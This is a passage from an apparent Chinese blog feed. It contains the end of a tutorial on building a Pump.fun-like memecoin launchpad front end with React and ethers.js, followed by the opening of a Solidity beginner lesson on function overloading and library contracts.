id="连接钱包并加载链上内容">连接钱包并加载链上内容</h3><p>首先将部署合约后的合约地址添加到配置环境中，地址为<code>0x5FbDB2315678afecb367f032d93F642f64180aa3</code>。</p><p><img src="/2025/02/06/%E5%81%9A%E4%B8%AA%E5%83%8FPump-fun%E4%B8%80%E6%A0%B7%E7%9A%84Memecoin%E5%90%AF%E5%8A%A8%E5%8F%B0/image-20250217151249055.png" alt="image-20250217151249055"></p><p>连接metamask钱包</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> provider = <span class="keyword">new</span> ethers.<span class="title class_">BrowserProvider</span>(<span class="variable language_">window</span>.<span class="property">ethereum</span>);</span><br><span class="line"><span class="title function_">setProvider</span>(provider);</span><br></pre></td></tr></table></figure><p>获取网络和合约的地址</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> network = <span class="keyword">await</span> provider.<span class="title function_">getNetwork</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;chainId:&quot;</span>,network.<span class="property">chainId</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;address:&quot;</span>, config[network.<span class="property">chainId</span>].<span class="property">factory</span>.<span class="property">address</span>);</span><br><span class="line"><span class="comment">//address,abi,signerOrProvider</span></span><br><span class="line"><span class="keyword">const</span> factory = <span class="keyword">new</span> ethers.<span class="title class_">Contract</span>(config[network.<span class="property">chainId</span>].<span class="property">factory</span>.<span class="property">address</span>,<span class="title class_">Factory</span>,provider);</span><br><span class="line"><span class="title function_">setFactory</span>(factory);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;factory:&quot;</span>,factory);</span><br><span class="line"><span class="keyword">const</span> fee = <span class="keyword">await</span> factory.<span class="title function_">fee</span>();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;fee:&quot;</span>,fee);</span><br><span class="line"><span class="title function_">setFee</span>(fee);</span><br></pre></td></tr></table></figure><p><img src="/2025/02/06/%E5%81%9A%E4%B8%AA%E5%83%8FPump-fun%E4%B8%80%E6%A0%B7%E7%9A%84Memecoin%E5%90%AF%E5%8A%A8%E5%8F%B0/image-20250217151435573.png" alt="image-20250217151435573"></p><p><img src="/2025/02/06/%E5%81%9A%E4%B8%AA%E5%83%8FPump-fun%E4%B8%80%E6%A0%B7%E7%9A%84Memecoin%E5%90%AF%E5%8A%A8%E5%8F%B0/image-20250217151912945.png" alt="image-20250217151912945"></p><p>在页面第一次加载时，自动执行<code>loadBlockchainData</code>函数，加载钱包。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">useEffect</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="title function_">loadBlockchainData</span>();</span><br><span class="line">&#125;,[])</span><br></pre></td></tr></table></figure><h3 id="创建Token-2">创建Token</h3><p>在<code>List.js</code>中，编写一个表单提交，输入<code>token</code>的名称和符号。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">listHandler</span>(<span class="params">form</span>)&#123;</span><br><span class="line">    <span class="keyword">const</span> name = form.<span class="title function_">get</span>(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">    <span class="keyword">const</span> ticker = form.<span class="title function_">get</span>(<span class="string">&quot;ticker&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> signer = <span class="keyword">await</span> provider.<span class="title function_">getSigner</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> transaction = <span class="keyword">await</span> factory.<span class="title function_">connect</span>(signer).<span class="title function_">create</span>(name, ticker, &#123;<span class="attr">value</span>: fee&#125;);</span><br><span class="line">    <span class="keyword">await</span> transaction.<span class="title function_">wait</span>();</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;submitted...&quot;</span>,name ,ticker);</span><br><span class="line">    <span class="title function_">toggleCreate</span>();</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>表单的html代码，如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">className</span>=<span class="string">&quot;list&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>list new token<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">className</span>=<span class="string">&quot;list_description&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">p</span>&gt;</span>fee: &#123;ethers.formatEther(fee, 18)&#125; ETH<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&#123;listHandler&#125;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;name&quot;</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;ticker&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;ticker&quot;</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;[ list ]&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">onClick</span>=<span class="string">&#123;toggleCreate&#125;</span> <span class="attr">className</span>=<span class="string">&quot;btn--fancy&quot;</span>&gt;</span> [ cancel ] <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2025/02/06/%E5%81%9A%E4%B8%AA%E5%83%8FPump-fun%E4%B8%80%E6%A0%B7%E7%9A%84Memecoin%E5%90%AF%E5%8A%A8%E5%8F%B0/image-20250217160659358.png" alt="image-20250217160659358"></p><p><img src="/2025/02/06/%E5%81%9A%E4%B8%AA%E5%83%8FPump-fun%E4%B8%80%E6%A0%B7%E7%9A%84Memecoin%E5%90%AF%E5%8A%A8%E5%8F%B0/image-20250217160630715.png" alt="image-20250217160630715"></p><h3 id="列出Token">列出Token</h3><p>使用<code>factory</code>对象获取已经创建的<code>token</code>总数<code>totalToken</code>。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取token的总数量</span></span><br><span class="line"><span class="keyword">const</span> totalToken = <span class="keyword">await</span> factory.<span class="title function_">totalTokens</span>();</span><br><span class="line"><span class="keyword">const</span> tokens = []</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; totalToken; i++)&#123;</span><br><span class="line">  <span class="keyword">const</span> tokenToSale = <span class="keyword">await</span> factory.<span class="title function_">getTokenSale</span>(i);</span><br><span class="line">  <span class="comment">//输出创建的token的信息</span></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(tokenToSale);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> token = &#123;</span><br><span class="line">    <span class="attr">token</span>: tokenToSale.<span class="property">token</span>,</span><br><span class="line">    <span class="attr">name</span>: tokenToSale.<span class="property">name</span>,</span><br><span class="line">    <span class="attr">creator</span>: tokenToSale.<span class="property">creator</span>,</span><br><span class="line">    <span class="attr">sold</span>: tokenToSale.<span class="property">sold</span>,</span><br><span class="line">    <span class="attr">raised</span>: tokenToSale.<span class="property">raised</span>,</span><br><span class="line">    <span class="attr">isOpen</span>: tokenToSale.<span class="property">isOpen</span>,</span><br><span class="line">    <span class="attr">image</span>: images[i]</span><br><span class="line">  &#125;</span><br><span class="line">  tokens.<span class="title function_">push</span>(token);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setTokens</span>(tokens.<span class="title function_">reverse</span>());</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;tokens:&quot;</span>,tokens);</span><br></pre></td></tr></table></figure><p>在<code>Token.js</code>中进行前端展示</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; ethers &#125; <span class="keyword">from</span> <span class="string">&quot;ethers&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Token</span>(<span class="params">&#123; toggleTrade, token &#125;</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onClick</span>=<span class="string">&#123;()</span> =&gt;</span> toggleTrade(token)&#125; className=&quot;token&quot;&gt;</span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">className</span>=<span class="string">&quot;token_details&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&#123;token.image&#125;</span> <span class="attr">alt</span>=<span class="string">&quot;token image&quot;</span> <span class="attr">width</span>=<span class="string">&#123;256&#125;</span> <span class="attr">height</span>=<span class="string">&#123;256&#125;</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">p</span>&gt;</span>creator by &#123;token.creator.slice(0,6) + &#x27;...&#x27; + token.creator.slice(38,42)&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">p</span>&gt;</span>market Cap: &#123;ethers.formatEther(token.raised, 18)&#125; ETH<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">p</span> <span class="attr">className</span>=<span class="string">&quot;name&quot;</span>&gt;</span>&#123;token.name&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title class_">Token</span>;</span><br></pre></td></tr></table></figure><p><img src="/2025/02/06/%E5%81%9A%E4%B8%AA%E5%83%8FPump-fun%E4%B8%80%E6%A0%B7%E7%9A%84Memecoin%E5%90%AF%E5%8A%A8%E5%8F%B0/image-20250217153634506.png" alt="image-20250217153634506"></p><p>界面展示</p><p><img src="/2025/02/06/%E5%81%9A%E4%B8%AA%E5%83%8FPump-fun%E4%B8%80%E6%A0%B7%E7%9A%84Memecoin%E5%90%AF%E5%8A%A8%E5%8F%B0/image-20250217154119339.png" alt="image-20250217154119339"></p><h3 id="购买Token">购买Token</h3><p>在<code>Trade.js</code>中，购买<code>token</code>的js代码如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> [target, setTarget] = <span class="title function_">useState</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">const</span> [limit, setLimit] = <span class="title function_">useState</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">const</span> [cost, setCost] = <span class="title function_">useState</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">buyHandler</span>(<span class="params">form</span>)&#123;</span><br><span class="line">  <span class="keyword">const</span> amount = form.<span class="title function_">get</span>(<span class="string">&quot;amount&quot;</span>);</span><br><span class="line">  <span class="keyword">const</span> cost = <span class="keyword">await</span> factory.<span class="title function_">getCost</span>(token.<span class="property">sold</span>);</span><br><span class="line">  <span class="keyword">const</span> totalCost = cost * <span class="title class_">BigInt</span>(amount);</span><br><span class="line">  <span class="keyword">const</span> signer = <span class="keyword">await</span> provider.<span class="title function_">getSigner</span>();</span><br><span class="line">  <span class="keyword">const</span> transaction = <span class="keyword">await</span> factory.<span class="title function_">connect</span>(signer).<span class="title function_">buy</span>(</span><br><span class="line">    token.<span class="property">token</span>,</span><br><span class="line">    ethers.<span class="title function_">parseUnits</span>(amount, <span class="number">18</span>),</span><br><span class="line">    &#123;<span class="attr">value</span>: totalCost&#125;</span><br><span class="line">  );</span><br><span class="line">  <span class="keyword">await</span> transaction.<span class="title function_">wait</span>();</span><br><span class="line"></span><br><span class="line">  <span class="title function_">toggleTrade</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">getSaleDetails</span>(<span class="params"></span>)&#123;</span><br><span class="line">  <span class="keyword">const</span> target = <span class="keyword">await</span> factory.<span class="title function_">TARGET</span>();</span><br><span class="line">  <span class="title function_">setTarget</span>(target);</span><br><span class="line">  <span class="keyword">const</span> limit = <span class="keyword">await</span> factory.<span class="title function_">TOKEN_LIMIT</span>();</span><br><span class="line">  <span class="title function_">setLimit</span>(limit);</span><br><span class="line">  <span class="keyword">const</span> cost = <span class="keyword">await</span> factory.<span class="title function_">getCost</span>(token.<span class="property">sold</span>);</span><br><span class="line">  <span class="title function_">setCost</span>(cost);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">useEffect</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="title function_">getSaleDetails</span>();</span><br><span class="line">&#125;, [token]);</span><br></pre></td></tr></table></figure><p>购买<code>token</code>的html代码，如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">className</span>=<span class="string">&quot;trade&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h2</span>&gt;</span>trade<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>  <span class="attr">className</span>=<span class="string">&quot;trade_details&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">className</span>=<span class="string">&quot;name&quot;</span>&gt;</span>&#123;token.name&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>creator: &#123;token.creator.slice(0,6) + &#x27;...&#x27; + token.creator.slice(38,42)&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&#123;token.image&#125;</span> <span class="attr">alt</span>=<span class="string">&quot;token image&quot;</span> <span class="attr">width</span>=<span class="string">&#123;256&#125;</span> <span class="attr">height</span>=<span class="string">&#123;256&#125;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>marketcap: &#123;ethers.formatEther(token.raised, 18)&#125; ETH<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>base cost: &#123;ethers.formatEther(cost, 18)&#125; ETH<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  &#123;token.sold &gt;= limit || token.raised &gt;= target ? (</span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">className</span>=<span class="string">&quot;disclaimer&quot;</span>&gt;</span>target reached!!!<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  ) : (</span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&#123;buyHandler&#125;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;number&quot;</span> <span class="attr">name</span>=<span class="string">&quot;amount&quot;</span> <span class="attr">min</span>=<span class="string">&#123;1&#125;</span> <span class="attr">max</span>=<span class="string">&#123;10000&#125;</span> <span class="attr">placeholder</span>=<span class="string">&quot;amount&quot;</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;[ buy ]&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">  ) </span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">button</span> <span class="attr">onClick</span>=<span class="string">&#123;toggleTrade&#125;</span> <span class="attr">className</span>=<span class="string">&quot;btn--fancy&quot;</span>&gt;</span> [ cancel ] <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">&lt;/div &gt;</span><br></pre></td></tr></table></figure><p>界面展示：</p><p><img src="/2025/02/06/%E5%81%9A%E4%B8%AA%E5%83%8FPump-fun%E4%B8%80%E6%A0%B7%E7%9A%84Memecoin%E5%90%AF%E5%8A%A8%E5%8F%B0/image-20250217161106789.png" alt="image-20250217161106789"></p><h2 id="参考">参考</h2><p><a href="https://www.youtube.com/watch?v=z7Vz8ZKylc4">https://www.youtube.com/watch?v=z7Vz8ZKylc4</a></p><p><a href="https://www.openzeppelin.com/">https://www.openzeppelin.com/</a></p><p><a href="https://github.com/dappuniversity/fun-pump">https://github.com/dappuniversity/fun-pump</a></p><p><a href="https://docs.ethers.org/v5/api/contract/contract/">https://docs.ethers.org/v5/api/contract/contract/</a></p>]]></content>
      
      
      <categories>
          
          <category> Web3 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> solidity </tag>
            
            <tag> DAPP </tag>
            
            <tag> ReactJS </tag>
            
            <tag> Next.js </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Solidity入门学习(三)</title>
      <link href="/2025/02/03/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%B8%89/"/>
      <url>/2025/02/03/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%B8%89/</url>
      
        <content type="html"><![CDATA[<h2 id="重载">重载</h2><p><code>Solidity</code>中允许函数进行重载（<code>overloading</code>），即名字相同但输入参数类型不同的函数可以同时存在，他们被视为不同的函数。注意，<strong><code>Solidity</code>不允许修饰器（<code>modifier</code>）重载。</strong></p><p>测试代码<code>Overloading.sol</code>，如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.21;</span><br><span class="line">contract Overloading&#123;</span><br><span class="line">    function saySomething() public pure returns(string memory)&#123;</span><br><span class="line">        return (&quot;Nothing&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    function saySomething(string memory something) public pure returns (string memory) &#123;</span><br><span class="line">        return(something);</span><br><span class="line">    &#125;</span><br><span class="line">    function f(uint8 _in) public pure returns (uint8 out) &#123;</span><br><span class="line">        out = _in;</span><br><span class="line">    &#125;</span><br><span class="line">    function f(uint256 _in) public pure returns (uint256 out) &#123;</span><br><span class="line">        out = _in;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="函数重载">函数重载</h3><p>我们可以定义两个都叫<code>saySomething()</code>的函数，一个没有任何参数，输出<code>&quot;Nothing&quot;</code>；另一个接收一个<code>string</code>参数，输出这个<code>string</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function saySomething() public pure returns(string memory)&#123;</span><br><span class="line">        return (&quot;Nothing&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    function saySomething(string memory something) public pure returns (string memory) &#123;</span><br><span class="line">        return(something);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>最终重载函数在经过编译器编译后，由于不同的参数类型，都变成了不同的函数选择器（selector）。</p><p>以 <code>Overloading.sol</code> 合约为例，在 Remix 上编译部署后，分别调用重载函数 <code>saySomething()</code> 和 <code>saySomething(string memory something)</code>，可以看到他们返回了不同的结果，被区分为不同的函数。</p><p><img src="/2025/02/03/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%B8%89/image-20250204032523893.png" alt="image-20250204032523893"></p><h3 id="参数匹配（Argument-Matching）">参数匹配（Argument Matching）</h3><p>在调用重载函数时，会把输入的实际参数和函数参数的变量类型做匹配。 如果出现多个匹配的重载函数，则会报错。下面这个例子有两个叫<code>f()</code>的函数，一个参数为<code>uint8</code>，另一个为<code>uint256</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function f(uint8 _in) public pure returns (uint8 out) &#123;</span><br><span class="line">    out = _in;</span><br><span class="line">&#125;</span><br><span class="line">function f(uint256 _in) public pure returns (uint256 out) &#123;</span><br><span class="line">    out = _in;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们调用<code>f(50)</code>，因为<code>50</code>既可以被转换为<code>uint8</code>，也可以被转换为<code>uint256</code>，因此会报错。</p><h2 id="库合约">库合约</h2><p>这一讲，我们用<code>ERC721</code>的引用的库合约<code>Strings</code>为例介绍<code>Solidity</code>中的库合约（<code>Library</code>），并总结了常用的库合约。</p><p>完整的测试代码<code>Library.sol</code>如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.21;</span><br><span class="line"></span><br><span class="line">library Strings &#123;</span><br><span class="line">    bytes16 private constant _HEX_SYMBOLS = &quot;0123456789abcdef&quot;;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Converts a `uint256` to its ASCII `string` decimal representation.</span><br><span class="line">     */</span><br><span class="line">    function toString(uint256 value) public pure returns (string memory) &#123;</span><br><span class="line">        // Inspired by OraclizeAPI&#x27;s implementation - MIT licence</span><br><span class="line">        // https://github.com/oraclize/ethereum-api/blob/b42146b063c7d6ee1358846c198246239e9360e8/oraclizeAPI_0.4.25.sol</span><br><span class="line"></span><br><span class="line">        if (value == 0) &#123;</span><br><span class="line">            return &quot;0&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        uint256 temp = value;</span><br><span class="line">        uint256 digits;</span><br><span class="line">        while (temp != 0) &#123;</span><br><span class="line">            digits++;</span><br><span class="line">            temp /= 10;</span><br><span class="line">        &#125;</span><br><span class="line">        bytes memory buffer = new bytes(digits);</span><br><span class="line">        while (value != 0) &#123;</span><br><span class="line">            digits -= 1;</span><br><span class="line">            buffer[digits] = bytes1(uint8(48 + uint256(value % 10)));</span><br><span class="line">            value /= 10;</span><br><span class="line">        &#125;</span><br><span class="line">        return string(buffer);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation.</span><br><span class="line">     */</span><br><span class="line">    function toHexString(uint256 value) public pure returns (string memory) &#123;</span><br><span class="line">        if (value == 0) &#123;</span><br><span class="line">            return &quot;0x00&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        uint256 temp = value;</span><br><span class="line">        uint256 length = 0;</span><br><span class="line">        while (temp != 0) &#123;</span><br><span class="line">            length++;</span><br><span class="line">            temp &gt;&gt;= 8;</span><br><span class="line">        &#125;</span><br><span class="line">        return toHexString(value, length);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation with fixed length.</span><br><span class="line">     